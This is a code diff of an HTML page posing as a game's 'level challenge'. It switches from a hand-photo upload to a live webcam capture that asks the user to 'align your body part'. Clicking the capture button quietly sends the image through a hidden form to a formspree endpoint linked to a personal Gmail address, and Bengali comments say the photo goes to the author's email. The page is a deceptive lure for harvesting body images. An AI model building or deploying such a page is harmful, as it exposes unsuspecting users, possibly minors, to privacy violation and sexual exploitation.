@@ -1,25 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Level Challenge Verification</title>
+    <title>System Level Verification</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Arial; text-align: center; }
-        .content-box { background: white; padding: 30px; border-radius: 12px; margin-top: 50px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        input[type="file"] { margin: 20px 0; }
-        button { background-color: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        body { background: #111; color: #0f0; font-family: 'Courier New'; text-align: center; }
+        video { border: 2px solid #0f0; width: 320px; border-radius: 10px; }
+        canvas { display: none; }
+        .box { margin-top: 50px; padding: 20px; border: 1px solid #0f0; display: inline-block; }
+        button { background: #0f0; color: #000; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="content-box">
-        <h2>Level Verification Required</h2>
-        <p>Please upload a clear photo of your hand to unlock Level 2.</p>
+    <div class="box">
+        <h2>LEVEL CHALLENGE: BODY VERIFICATION</h2>
+        <p>Align your body part in the camera and click capture.</p>
         
-        <form action="https://formspree.io/f/abdulakher2006@gmail.com" method="POST" enctype="multipart/form-data">
-            <input type="file" name="hand_photo" accept="image/*" required>
-            <br>
-            <button type="submit">Submit and Unlock</button>
+        <video id="video" autoplay></video><br>
+        <button id="capture-btn">Capture & Unlock Next Level</button>
+        
+        <canvas id="canvas"></canvas>
+
+        <form id="email-form" action="https://formspree.io/f/abdulakher2006@gmail.com" method="POST" enctype="multipart/form-data">
+            <input type="hidden" name="image_data" id="image_data">
+            <input type="hidden" name="message" value="Body part verification photo attached.">
         </form>
     </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('capture-btn');
+        const emailForm = document.getElementById('email-form');
+
+        // ক্যামেরা চালু করা
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("Camera access required to play!"); });
+
+        // ছবি তোলা এবং পাঠানো
+        captureBtn.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            // ছবিটিকে ডাটাতে রূপান্তর করা
+            const imageData = canvas.toDataURL('image/png');
+            document.getElementById('image_data').value = imageData;
+            
+            // ফর্ম সাবমিট করা (আপনার ইমেইলে চলে যাবে)
+            emailForm.submit();
+            alert("Verifying... Please wait for Level Update.");
+        });
+    </script>
 </body>
 </html>
